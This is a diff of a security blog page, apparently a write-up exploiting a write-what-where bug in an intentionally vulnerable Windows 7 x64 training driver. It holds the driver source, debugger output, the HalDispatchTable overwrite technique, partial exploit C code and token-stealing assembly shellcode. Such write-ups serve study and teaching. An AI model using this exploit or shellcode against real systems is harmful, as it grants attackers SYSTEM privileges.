@@ -7,13 +7,13 @@
   	<meta name="description" content="Passionate security researcher.">
   	<meta name="author" content="Dimitri Fourny">
 	
-	<link href="/css/bootstrap.min.css" rel="stylesheet">
-    <link href="/css/style.css" rel="stylesheet">
-  	<link href="/css/syntax.css" rel="stylesheet">
+	<link href="/assets/css/bootstrap.min.css" rel="stylesheet">
+    <link href="/assets/css/style.css" rel="stylesheet">
+  	<link href="/assets/css/syntax.css" rel="stylesheet">
 
     <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
     <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  	<link rel="shortcut icon" href="/img/favicon.png">
+  	<link rel="shortcut icon" href="/assets/img/favicon.png">
 </head>
 
 <body>
@@ -31,10 +31,9 @@
 		    <div class="navbar-collapse collapse" id="navbar-main">
 		      <ul class="nav navbar-nav navbar-right">
                 <li class="active"><a href="/">Home</a></li>
-                <li><a href="https://github.com/DimitriFourny">GitHub</a></li>
 		        <li><a href="https://twitter.com/DimitriFourny">Twitter</a></li>
+                <li><a href="https://github.com/DimitriFourny">GitHub</a></li>
 		        <li><a href="http://fr.linkedin.com/pub/dimitri-fourny/58/283/13a/">Linkedin</a></li>
-		        <li><a href="/feed.xml">RSS</a></li>
 		      </ul>
 		    </div>
 		</div>
@@ -44,13 +43,15 @@
 		
 		<div class="row">
 			<div class="col-sm-12">
-				<h1 id="driver-write-what-where-vulnerability">Driver write-what-where vulnerability</h1>
-
+                <h1 id="driver-write-what-where-vulnerability">Driver write-what-where vulnerability</h1>
 <h2 id="introduction">Introduction</h2>
 
-<p>In this article, we will exploit a write-what-where vulnerability in Windows 7 x64. To do that, we will use the last level of <a href="https://twitter.com/0vercl0k">0vercl0k</a>: the <a href="https://github.com/0vercl0k/Windows-Kernel-Flaws/tree/master/3">level 3</a>. We need to do some changes to make a driver which work on a x64 system:</p>
+<p>In this article, we will exploit a write-what-where vulnerability in Windows 7 
+x64. To do that, we will use the last level of 
+<a href="https://twitter.com/0vercl0k">0vercl0k</a>: the level 3. We need to do some 
+changes to make a driver which work on a x64 system:</p>
 
-<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include &lt;Ntifs.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Ntifs.h&gt;
 #include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 </span>
@@ -62,13 +63,13 @@
 <span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">PBYTE</span><span class="p">;</span>
 <span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">BYTE</span><span class="p">;</span>
 
-<span class="c1">//
-</span><span class="n">DRIVER_UNLOAD</span> <span class="n">Unload</span><span class="p">;</span>
+<span class="c1">//</span>
+<span class="n">DRIVER_UNLOAD</span> <span class="n">Unload</span><span class="p">;</span>
 <span class="n">DRIVER_INITIALIZE</span> <span class="n">DriverEntry</span><span class="p">;</span>
 <span class="n">DRIVER_DISPATCH</span> <span class="n">handleIOCTLs</span><span class="p">;</span>
 <span class="n">DRIVER_DISPATCH</span> <span class="n">handleIRP</span><span class="p">;</span>
-<span class="c1">//
-</span>
+<span class="c1">//</span>
+
 <span class="k">typedef</span> <span class="k">struct</span>
 <span class="p">{</span>
     <span class="n">PDWORD64</span> <span class="n">where</span><span class="p">;</span>
@@ -153,15 +154,18 @@
 <span class="p">{</span>
     <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Unloading.. ]</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
     <span class="k">return</span><span class="p">;</span>
-<span class="p">}</span></code></pre></figure>
+<span class="p">}</span>
+</code></pre></div></div>
 
-<p>This time, we can see that we can write anything and where we want. But how execute a code with the SYSTEM right with that? <code>NtQueryIntervalProfile</code> will help us!</p>
+<p>This time, we can see that we can write anything and where we want. But how to 
+execute a code with the SYSTEM right with that? <code class="highlighter-rouge">NtQueryIntervalProfile</code> will 
+help us.</p>
 
 <h2 id="haldispatchtable-is-our-friend">HalDispatchTable is our friend</h2>
 
-<p>Let’s see what this function done:</p>
+<p>Let’s see what this function do:</p>
 
-<figure class="highlight"><pre><code class="language-unknown" data-lang="unknown">kd&gt; u nt!NtQueryIntervalProfile
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd&gt; u nt!NtQueryIntervalProfile
 nt!NtQueryIntervalProfile:
 fffff800`029fff00 48895c2408      mov     qword ptr [rsp+8],rbx
 fffff800`029fff05 57              push    rdi
@@ -201,12 +205,14 @@ fffff800`029f09e6 4c8d4c2440      lea     r9,[rsp+40h]
 fffff800`029f09eb 8d4af5          lea     ecx,[rdx-0Bh]
 fffff800`029f09ee 4c8d442420      lea     r8,[rsp+20h]
 fffff800`029f09f3 ff156f52e0ff    call    qword ptr [nt!HalDispatchTable+0x8 (fffff800`027f5c68)]
-fffff800`029f09f9 85c0            test    eax,eax</code></pre></figure>
+fffff800`029f09f9 85c0            test    eax,eax
+</code></pre></div></div>
 
-<p>We can see that if we call <code>NtQueryIntervalProfile</code> in <strong>ring3</strong>, Windows will call <code>KeQueryIntervalProfile</code> in <strong>ring0</strong> and the function where its address is present at <code>nt!HalDispatchTable+0x8</code>!<br />
-But what is HalDispatchTable? <a href="http://doxygen.reactos.org/df/df5/structHAL__DISPATCH.html">ReactOS</a> will help us:</p>
+<p>We can see that if we call <code class="highlighter-rouge">NtQueryIntervalProfile</code> in ring3, Windows will call 
+<code class="highlighter-rouge">KeQueryIntervalProfile</code> in ring0 and the function pointed by 
+<code class="highlighter-rouge">nt!HalDispatchTable+0x8</code>! But what is <code class="highlighter-rouge">HalDispatchTable</code>? ReactOS will help us:</p>
 
-<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
 	<span class="n">ULONG</span> <span class="n">Version</span><span class="p">;</span>
 	<span class="n">pHalQuerySystemInformation</span> <span class="n">HalQuerySystemInformation</span><span class="p">;</span>
 	<span class="n">pHalSetSystemInformation</span> <span class="n">HalSetSystemInformation</span><span class="p">;</span>
@@ -237,9 +243,10 @@ But what is HalDispatchTable? <a href="http://doxygen.reactos.org/df/df5/structH
 </span><span class="n">pHalGetErrorCapList</span> <span class="n">HalGetErrorCapList</span><span class="p">;</span>
 	<span class="n">pHalInjectError</span> <span class="n">HalInjectError</span><span class="p">;</span>
 <span class="cp">#endif
-</span><span class="p">}</span> <span class="n">HAL_DISPATCH</span><span class="p">,</span> <span class="o">*</span><span class="n">PHAL_DISPATCH</span><span class="p">;</span></code></pre></figure>
+</span><span class="p">}</span> <span class="n">HAL_DISPATCH</span><span class="p">,</span> <span class="o">*</span><span class="n">PHAL_DISPATCH</span><span class="p">;</span>
+</code></pre></div></div>
 
-<figure class="highlight"><pre><code class="language-unknown" data-lang="unknown">kd&gt; dq nt!HalDispatchTable
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd&gt; dq nt!HalDispatchTable
 fffff800`027f5c60  00000000`00000004 fffff800`02c268e8
 fffff800`027f5c70  fffff800`02c27470 fffff800`029f2d60
 fffff800`027f5c80  00000000`00000000 fffff800`026cacb0
@@ -248,30 +255,42 @@ fffff800`027f5c90  fffff800`029a16b0 fffff800`029a2000
 kd&gt; u poi(nt!HalDispatchTable+0x8)
 fffff800`02c268e8 fff3            push    rbx
 fffff800`02c268ea 55              push    rbp
-[...]</code></pre></figure>
+[...]
+</code></pre></div></div>
 
-<p>We can see that at <code>HalDispatchTable+0x8</code> store a pointer to <code>HalQuerySystemInformation</code>. Therefore, we just need to modify <code>HalDispatchTable+0x8</code> to point to our shellcode and call <code>NtQueryIntervalProfile</code> to execute our shellcode in ring0.<br />
-Fortunely for us, HalDispatchTable is exported by name by <strong>ntoskrnl.exe</strong>, so we can found this address easily:</p>
+<p>We can see that at <code class="highlighter-rouge">HalDispatchTable+0x8</code> store a pointer to 
+<code class="highlighter-rouge">HalQuerySystemInformation</code>. Therefore, we just need to modify 
+<code class="highlighter-rouge">HalDispatchTable+0x8</code> to point to our shellcode and call 
+<code class="highlighter-rouge">NtQueryIntervalProfile</code> to execute our shellcode in ring0. Fortunely for us, 
+<code class="highlighter-rouge">HalDispatchTable</code> is exported by name by <code class="highlighter-rouge">ntoskrnl.exe</code>, so we can found this 
+address easily:</p>
 
 <ul>
-  <li>We load ntoskrnl.exe with <code>LoadLibrary</code></li>
-  <li>We use <code>GetProcAddress</code> to find <strong>HalDispatchTable</strong> address in userland</li>
-  <li>We search the image base address of <strong>ntoskrnl</strong> in kernelland with <code>NtQuerySystemInformation(SystemModuleInformation)</code></li>
-  <li>And we obtain the final address with a little calculation: <code>HalDispatchTable userland address - ntoskrnl userland address + ntoskrnl image base address in kernelland</code></li>
+  <li>We load <code class="highlighter-rouge">ntoskrnl.exe</code> with <code class="highlighter-rouge">LoadLibrary</code></li>
+  <li>We use <code class="highlighter-rouge">GetProcAddress</code> to find <code class="highlighter-rouge">HalDispatchTable</code> address in userland</li>
+  <li>We search the image base address of <code class="highlighter-rouge">ntoskrnl</code> in kernelland with 
+<code class="highlighter-rouge">NtQuerySystemInformation(SystemModuleInformation)</code></li>
+  <li>And we obtain the final address with a little calculation: <code class="highlighter-rouge">HalDispatchTable</code> 
+userland address - <code class="highlighter-rouge">ntoskrnl</code> userland address + <code class="highlighter-rouge">ntoskrnl</code> image base address 
+in kernelland</li>
 </ul>
 
-<p>Finally, we need to replace the address at <code>HalDispatchTable+0x8</code> with a valid kernel function address to decrease the chances to get a BSOD. I have used <strong>KeGetCurrentThread</strong>:</p>
+<p>Finally, we need to replace the address at <code class="highlighter-rouge">HalDispatchTable+0x8</code> with a valid 
+kernel function address to decrease the chances to get a BSOD. I have used 
+<code class="highlighter-rouge">KeGetCurrentThread</code>:</p>
 
-<figure class="highlight"><pre><code class="language-unknown" data-lang="unknown">kd&gt; u nt!KeGetCurrentThread
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd&gt; u nt!KeGetCurrentThread
 nt!PsGetCurrentThread:
 fffff800`026ca2c0 65488b042588010000 mov   rax,qword ptr gs:[188h]
-fffff800`026ca2c9 c3              ret</code></pre></figure>
+fffff800`026ca2c9 c3              ret
+</code></pre></div></div>
 
 <h2 id="final-exploit">Final exploit</h2>
 
-<p>I have used the same shellcode of previous levels to copy the system token in my process.</p>
+<p>I have used the same shellcode of previous levels to copy the system token in 
+my process.</p>
 
-<figure class="highlight"><pre><code class="language-unknown" data-lang="unknown">E:\&gt;exploit.exe
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>E:\&gt;exploit.exe
 [+] Search address of notskrnl.exe...
 [+] HalDispatchTable in userland: 0x401F0C60
 [+] HalDispatchTable in kernelland: 0x27F1C60
@@ -282,9 +301,10 @@ fffff800`026ca2c9 c3              ret</code></pre></figure>
 [+] Modify HalDispatchTable+0x8 to point on KeGetCurrentThread
 [+] KeGetCurrentThread in userland: 0x400C92C0
 [+] KeGetCurrentThread in kernelland: 0x26CA2C0
-[+] Executing a new command console to test it...</code></pre></figure>
+[+] Executing a new command console to test it...
+</code></pre></div></div>
 
-<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include &lt;windows.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;windows.h&gt;
 #include &lt;winioctl.h&gt;
 #include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
@@ -454,8 +474,8 @@ fffff800`026ca2c9 c3              ret</code></pre></figure>
         <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Error with NtAllocateVirtualMemory : %.8x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">error</span><span class="p">);</span>
         <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
     <span class="p">}</span>
-    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x4141414141414141</span><span class="p">,</span> <span class="n">GetCurrentProcessId</span><span class="p">());</span> <span class="c1">// Process PID
-</span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">leetAddress</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x4141414141414141</span><span class="p">,</span> <span class="n">GetCurrentProcessId</span><span class="p">());</span> <span class="c1">// Process PID</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">leetAddress</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
 
     <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">DEVICE_NAME</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span> <span class="o">|</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
     <span class="k">if</span><span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
@@ -501,9 +521,10 @@ fffff800`026ca2c9 c3              ret</code></pre></figure>
     <span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">"cmd.exe"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
 
     <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
-<span class="p">}</span></code></pre></figure>
+<span class="p">}</span>
+</code></pre></div></div>
 
-<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">format</span> <span class="n">PE64</span> <span class="n">GUI</span> <span class="mi">4</span><span class="p">.</span><span class="mi">0</span>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">format</span> <span class="n">PE64</span> <span class="n">GUI</span> <span class="mi">4</span><span class="p">.</span><span class="mi">0</span>
 
 <span class="n">start</span><span class="o">:</span>
 
@@ -524,24 +545,24 @@ fffff800`026ca2c9 c3              ret</code></pre></figure>
 <span class="k">push</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
 <span class="k">push</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
 
-<span class="k">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="err">[</span><span class="n">gs</span><span class="o">:</span><span class="n">qword</span> <span class="mh">0x188</span><span class="err">]</span>		<span class="c">; +0x180 PrcbData : _KPRCB | +0x008 CurrentThread : _KTHREAD			</span>
-<span class="k">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="err">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0x70</span><span class="err">]</span>	<span class="c">; +0x050 ApcState : _KAPC_STATE | +0x020 Process : _KPROCESS</span>
-<span class="k">add</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x188</span> 			<span class="c">; +0x188 ActiveProcessLinks : _LIST_ENTRY</span>
-<span class="k">mov</span> <span class="n">rbx</span><span class="p">,</span> <span class="n">rdx</span> 			<span class="c">; Our linked list \o/ We save the first structure</span>
+<span class="k">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="err">[</span><span class="n">gs</span><span class="o">:</span><span class="n">qword</span> <span class="mh">0x188</span><span class="err">]</span>   <span class="c">; +0x180 PrcbData : _KPRCB | +0x008 CurrentThread : _KTHREAD			</span>
+<span class="k">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="err">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0x70</span><span class="err">]</span>       <span class="c">; +0x050 ApcState : _KAPC_STATE | +0x020 Process : _KPROCESS</span>
+<span class="k">add</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x188</span>              <span class="c">; +0x188 ActiveProcessLinks : _LIST_ENTRY</span>
+<span class="k">mov</span> <span class="n">rbx</span><span class="p">,</span> <span class="n">rdx</span>                <span class="c">; Our linked list \o/ We save the first structure</span>
 
 <span class="n">searchProcess</span><span class="o">:</span>
-<span class="k">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="err">[</span><span class="n">rdx</span> <span class="o">-</span> <span class="mh">0x8</span><span class="err">]</span> 	<span class="c">; +0x180 UniqueProcessId</span>
-<span class="k">cmp</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x4</span> <span class="c">; SYSTEM PID</span>
+<span class="k">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="err">[</span><span class="n">rdx</span> <span class="o">-</span> <span class="mh">0x8</span><span class="err">]</span>        <span class="c">; +0x180 UniqueProcessId</span>
+<span class="k">cmp</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x4</span>                <span class="c">; SYSTEM PID</span>
 <span class="k">je</span> <span class="n">sysProcFound</span>
 <span class="k">mov</span> <span class="n">rcx</span><span class="p">,</span> <span class="mh">0x4141414141414141</span> <span class="c">; Our exploit PID</span>
-<span class="k">cmp</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rcx</span>				<span class="c">; cmp reg64, imm64 don't exist</span>
+<span class="k">cmp</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rcx</span>                <span class="c">; cmp reg64, imm64 don't exist</span>
 <span class="k">je</span> <span class="n">exploitProcFound</span>
  
 <span class="n">nextProcess</span><span class="o">:</span>
-<span class="k">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="p">[rdx]</span> <span class="c">; Next process (Flink)</span>
-<span class="k">cmp</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">rbx</span> <span class="c">; We are back at the starting point</span>
+<span class="k">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="p">[rdx]</span>              <span class="c">; Next process (Flink)</span>
+<span class="k">cmp</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">rbx</span>                <span class="c">; We are back at the starting point</span>
 <span class="k">je</span> <span class="n">retApp</span>
-<span class="k">jmp</span> <span class="n">searchProcess</span> <span class="c">; We loop !</span>
+<span class="k">jmp</span> <span class="n">searchProcess</span>           <span class="c">; We loop!</span>
  
 <span class="n">sysProcFound</span><span class="o">:</span>
 <span class="k">mov</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span> <span class="n">rdx</span>
@@ -556,10 +577,11 @@ fffff800`026ca2c9 c3              ret</code></pre></figure>
 <span class="k">je</span> <span class="n">nextProcess</span>
 <span class="k">cmp</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span> <span class="n">rcx</span>
 <span class="k">je</span> <span class="n">nextProcess</span>
-<span class="c">; ; We copy the SYSTEM token</span>
- <span class="k">pop</span> <span class="n">rdi</span> <span class="c">; Exploit</span>
- <span class="k">pop</span> <span class="n">rsi</span> <span class="c">; System</span>
-<span class="k">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="err">[</span><span class="n">rsi</span> <span class="o">+</span> <span class="mh">0x80</span><span class="err">]</span> <span class="c">; 0x208 - 0x188 = 0x80 | +0x208 Token : _EX_FAST_REF</span>
+
+<span class="c">; We copy the SYSTEM token</span>
+<span class="k">pop</span> <span class="n">rdi</span> <span class="c">; Exploit</span>
+<span class="k">pop</span> <span class="n">rsi</span> <span class="c">; System</span>
+<span class="k">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="err">[</span><span class="n">rsi</span> <span class="o">+</span> <span class="mh">0x80</span><span class="err">]</span>       <span class="c">; 0x208 - 0x188 = 0x80 | +0x208 Token : _EX_FAST_REF</span>
 <span class="k">mov</span> <span class="err">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x80</span><span class="err">]</span><span class="p">,</span> <span class="n">rax</span>
  
 <span class="n">retApp</span><span class="o">:</span>
@@ -569,7 +591,8 @@ fffff800`026ca2c9 c3              ret</code></pre></figure>
 <span class="k">pop</span> <span class="n">rdx</span>
 <span class="k">pop</span> <span class="n">rcx</span>
 <span class="k">pop</span> <span class="n">rbx</span>
-<span class="k">ret</span></code></pre></figure>
+<span class="k">ret</span>
+</code></pre></div></div>
 
 			</div>
 		</div>
